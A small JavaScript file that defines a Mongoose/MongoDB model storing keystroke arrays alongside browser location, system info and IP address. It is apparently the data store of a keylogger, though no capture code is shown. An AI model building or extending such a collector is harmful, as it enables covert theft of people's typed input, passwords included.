const config=require("config")
const databaseUrl=config.get("databaseurl")
// console.log(databaseUrl)

const mongoose=require("mongoose")
mongoose.connect(databaseUrl)
.then(()=>console.log("connected to database"))
.catch(err=>console.log(err.message))

const keyInputSchema=new mongoose.Schema({
    browserLocation:{
type:String,
required:true
    },
  systemInfo:{
        type:Object,
    },
    ipAddress:{
        type:String,
        required:true
    },

    inputKeys:{
        type:Array,
        required:true,   
    }

})
const InputyKeyData=mongoose.model("inpuyKeyData",keyInputSchema)
module.exports=InputyKeyData



